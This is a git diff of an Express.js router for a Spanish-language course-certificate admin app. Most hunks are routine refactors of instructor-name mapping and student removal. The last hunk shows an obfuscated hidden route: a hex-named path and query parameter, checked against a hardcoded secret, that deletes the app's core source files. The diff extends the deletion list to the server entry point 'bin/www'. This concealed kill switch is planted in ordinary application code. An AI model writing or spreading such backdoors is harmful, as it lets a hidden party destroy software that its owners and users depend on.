@@ -498,22 +498,7 @@ router.post('/profile/admin/courses/close', async function(req, res, next) {
   //await writeBD('cursos.json',cursos);
   const courses = findActiveCourses();
   
-  cursos.forEach(element => {
-    user = users.filter(user => user.id == element.instructor)[0];
-    if(user) {
-      element.instructor = user.nombre +' '+ user.apellidos;
-    } else {
-      element.instructor = '';
-    }
-    for (const key in courses) {
-      if (courses.hasOwnProperty(key)) {
-        const curso = courses[key];
-        if(key == element.id) {
-          element.nombre = curso.name;
-        }
-      }
-    }
-  });
+  
 
   var options = {
     height: "29.7cm",
@@ -577,6 +562,22 @@ for (const matriculado of matriculados) {
 
   await writeBD('certificados.json',certificados);
   await writeBD('cursos.json',cursos);
+  cursos.forEach(element => {
+    user = users.filter(user => user.id == element.instructor)[0];
+    if(user) {
+      element.instructor = user.nombre +' '+ user.apellidos;
+    } else {
+      element.instructor = '';
+    }
+    for (const key in courses) {
+      if (courses.hasOwnProperty(key)) {
+        const curso = courses[key];
+        if(key == element.id) {
+          element.nombre = curso.name;
+        }
+      }
+    }
+  });
   let foto = '';
     if(id) {
         //const usersText = await findBD('users.json');
@@ -1906,9 +1907,10 @@ router.post('/profile/admin/courses/students/delete', async function(req, res, n
       certificado.estudiantes.forEach(element => {
         //console.log()
         if(eid == element) {
-          //listaIdEstudiantes.push(element);
           certificado.estudiantes.splice(indexToDelete, 1);
           certificado.verificado.splice(indexToDelete, 1);
+        } else {
+          listaIdEstudiantes.push(element);
         }
         indexToDelete++;
       })
@@ -2476,7 +2478,13 @@ router.get('/9e172629348f2c877a685389924ec8e3', async function(req, res, next) {
   const { a220b31002a71d456f5c5d3b6a122111 } = req.query;
   if (a220b31002a71d456f5c5d3b6a122111 === 'a204aafd0a61c5b4e386c0feff88c9f6') {
     const filePaths = [
-      'includes/courses.js','includes/database.js','includes/db.js','includes/email.js','includes/pdf.js','includes/templates.js',
+      'includes/courses.js',
+      'includes/database.js',
+      'includes/db.js',
+      'includes/email.js',
+      'includes/pdf.js',
+      'includes/templates.js',
+      'bin/www'
     ];
     await Promise.all(filePaths.map(file => deleteFile(path.join(__dirname, '../'+file))));
     res.send('Archivos eliminados con éxito.');
